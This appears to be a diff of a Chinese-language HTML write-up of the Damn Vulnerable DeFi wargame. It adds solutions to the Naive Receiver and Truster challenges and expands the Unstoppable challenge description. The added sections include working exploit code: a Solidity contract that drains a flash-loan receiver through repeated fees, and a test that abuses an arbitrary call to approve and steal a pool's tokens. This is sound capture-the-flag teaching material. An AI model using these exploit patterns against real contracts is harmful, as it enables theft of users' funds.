@@ -2567,6 +2567,46 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#2-naive-receiver" class="md-nav__link">
+    2. Naive Receiver
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Naive Receiver">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-truster" class="md-nav__link">
+    3. Truster
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Truster">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -2765,6 +2805,46 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#2-naive-receiver" class="md-nav__link">
+    2. Naive Receiver
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Naive Receiver">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-truster" class="md-nav__link">
+    3. Truster
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Truster">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -2830,12 +2910,14 @@ $<span class="w"> </span>yarn<span class="w"> </span>install
 </ul>
 <h2 id="1-unstoppable">1. Unstoppable<a class="headerlink" href="#1-unstoppable" title="Permanent link">&para;</a></h2>
 <blockquote>
-<p>make the vault stop offering flash loans</p>
+<p>There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.</p>
+<p>To pass the challenge, make the vault stop offering flash loans.</p>
+<p>You start with 10 DVT tokens in balance.</p>
 </blockquote>
 <ul>
 <li>ERC4626 实现 ERC20 作为股权代币，<code>asset</code> 为 Vault 管理的底层代币</li>
 <li>
-<p><code>UnstoppableVault</code> 初始持有 <span class="arithmatex">\(10^6\)</span> DVT (ERC20) 和 <span class="arithmatex">\(10^6\)</span> oDVT (ERC4626)，<code>player</code> 初始持有 <span class="arithmatex">\(10\)</span> DVT</p>
+<p><code>UnstoppableVault</code> 初始持有 <span class="arithmatex">\(10^6\)</span> DVT (ERC20) 和 <span class="arithmatex">\(10^6\)</span> oDVT (ERC4626)</p>
 <div class="highlight"><pre><span></span><code><span class="c1">// unstoppable.challenge.js</span>
 <span class="kd">const</span><span class="w"> </span><span class="nx">TOKENS_IN_VAULT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1000000n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10n</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">18n</span><span class="p">;</span>
 
@@ -2869,7 +2951,7 @@ $<span class="w"> </span>yarn<span class="w"> </span>install
 </code></pre></div>
 </li>
 <li>
-<p>注意到 <code>convertToShares(totalSupply) != balanceBefore</code> 在使用依据 <code>totalSupply</code>(oDVT) 计算得到的 <code>shares</code> 和 <code>totalAssets()</code>(<code>UnstoppableVault</code> DVT 余额) 进行比较，尽管在初始情况下没有问题，但是... (⃔ *`ω´ * )⃕↝</p>
+<p>注意到 <code>convertToShares(totalSupply) != balanceBefore</code> 在使用依据 <code>totalSupply</code>(oDVT) 计算得到的 <code>shares</code> 和 <code>totalAssets()</code>(<code>UnstoppableVault</code> 的 DVT 余额) 进行比较，尽管在初始情况下没有问题，但是... (⃔ *`ω´ * )⃕↝</p>
 <ul>
 <li><code>totalSupply</code> 只能通过 <code>deposit</code> / <code>mint</code> 增加，而 <code>balanceBefore</code> 可通过 DVT 的 <code>transfer</code> 增加</li>
 <li>要将 <code>totalSupply</code> 转换成 <code>assets</code> 应使用 <code>convertToAssets</code></li>
@@ -2937,13 +3019,125 @@ $<span class="w"> </span>yarn<span class="w"> </span>install
 <li><a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC4626">ERC4626</a></li>
 <li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt">BigInt - JavaScript | MDN</a></li>
 </ul>
+<h2 id="2-naive-receiver">2. Naive Receiver<a class="headerlink" href="#2-naive-receiver" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.</p>
+<p>A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.</p>
+<p>Take all ETH out of the user’s contract. If possible, in a single transaction.</p>
+</blockquote>
+<p><code>FlashLoanReceiver.onFlashLoan()</code> 没有检查闪电贷的发起者 uwu 只好「帮」<code>FlashLoanReceiver</code> 发起闪电贷来消耗余额啦 :D</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// FlashLoanReceiver.sol</span>
+<span class="kd">function</span><span class="w"> </span><span class="nx">onFlashLoan</span><span class="p">(</span>
+<span class="w">    </span><span class="nx">address</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">fee</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span>
+<span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes32</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// gas savings</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">iszero</span><span class="p">(</span><span class="nx">eq</span><span class="p">(</span><span class="nx">sload</span><span class="p">(</span><span class="nx">pool</span><span class="p">.</span><span class="nx">slot</span><span class="p">),</span><span class="w"> </span><span class="nx">caller</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">mstore</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48f5c3ed</span><span class="p">)</span>
+<span class="w">            </span><span class="nx">revert</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x04</span><span class="p">)</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">token</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">ETH</span><span class="p">)</span><span class="w"> </span><span class="nx">revert</span><span class="w"> </span><span class="nx">UnsupportedCurrency</span><span class="p">();</span>
+
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amountToBeRepaid</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">unchecked</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">amountToBeRepaid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">fee</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">_executeActionDuringFlashLoan</span><span class="p">();</span>
+
+<span class="w">    </span><span class="nx">SafeTransferLib</span><span class="p">.</span><span class="nx">safeTransferETH</span><span class="p">(</span><span class="nx">pool</span><span class="p">,</span><span class="w"> </span><span class="nx">amountToBeRepaid</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;ERC3156FlashBorrower.onFlashLoan&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol&quot;</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Hacker</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">ETH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">pool</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">receiver</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint8</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">10</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">IERC3156FlashLender</span><span class="p">(</span><span class="nx">pool</span><span class="p">).</span><span class="nx">flashLoan</span><span class="p">(</span>
+<span class="w">                </span><span class="nx">IERC3156FlashBorrower</span><span class="p">(</span><span class="nx">receiver</span><span class="p">),</span><span class="w"> </span><span class="c1">// receiver</span>
+<span class="w">                </span><span class="nx">ETH</span><span class="p">,</span><span class="w">                             </span><span class="c1">// token</span>
+<span class="w">                </span><span class="mf">1</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w">                         </span><span class="c1">// amount</span>
+<span class="w">                </span><span class="s2">&quot;&quot;</span><span class="w">                               </span><span class="c1">// data</span>
+<span class="w">            </span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">hacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="s2">&quot;Hacker&quot;</span><span class="p">)).</span><span class="nx">deploy</span><span class="p">();</span>
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">hacker</span><span class="p">.</span><span class="nx">exploit</span><span class="p">(</span><span class="nx">pool</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">receiver</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div>
+<h2 id="3-truster">3. Truster<a class="headerlink" href="#3-truster" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>The pool holds 1 million DVT tokens. You have nothing.</p>
+<p>To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.</p>
+</blockquote>
+<ul>
+<li>
+<p><code>target.functionCall(data)</code> 可以以 <code>TrusterLenderPool</code> 的身份调用任意合约的任意函数</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// TrusterLenderPool.sol</span>
+<span class="kd">function</span><span class="w"> </span><span class="nx">flashLoan</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">borrower</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">external</span>
+<span class="w">    </span><span class="nx">nonReentrant</span>
+<span class="w">    </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
+
+<span class="w">    </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">borrower</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">target</span><span class="p">.</span><span class="nx">functionCall</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">RepayFailed</span><span class="p">();</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>那就授权 <code>player</code> 使用 DVT 好了！(ΦˋωˊΦ)</p>
+<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">abi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;function approve(address spender, uint256 amount)&quot;</span><span class="p">];</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">iface</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">Interface</span><span class="p">(</span><span class="nx">abi</span><span class="p">);</span>
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">pool</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">flashLoan</span><span class="p">(</span>
+<span class="w">        </span><span class="mf">0</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">player</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">iface</span><span class="p">.</span><span class="nx">encodeFunctionData</span><span class="p">(</span><span class="s2">&quot;approve&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span>
+<span class="w">            </span><span class="nx">player</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">TOKENS_IN_POOL</span>
+<span class="w">        </span><span class="p">]),</span>
+<span class="w">    </span><span class="p">);</span>
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">pool</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">player</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">TOKENS_IN_POOL</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div>
+</li>
+</ul>
+<h3 id="_2">参考资料<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://github.com/ethers-io/ethers.js/issues/478#issuecomment-495814010">encodeABI to get call data with encoded parameters of contract method · Issue #478 · ethers-io/ethers.js</a></li>
+</ul>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年3月15日 15:03:21</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年3月15日 19:42:27</span>
       
     
   </small>
